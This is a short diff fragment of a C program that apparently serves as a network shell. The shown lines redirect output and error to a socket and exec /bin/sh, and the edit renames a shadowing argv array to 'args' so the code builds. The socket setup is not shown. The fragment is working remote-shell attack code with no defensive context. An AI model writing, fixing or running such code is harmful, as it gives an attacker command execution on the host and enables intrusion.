@@ -22,8 +22,8 @@ int main(int argc, char *argv[]){
     dup2(sockt, 1);
     dup2(sockt, 2);
 
-    char * const argv[] = {"/bin/sh", NULL};
-    execve("/bin/sh", argv, NULL);
+    char * const args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", args, NULL);
 
     return 0;       
 }
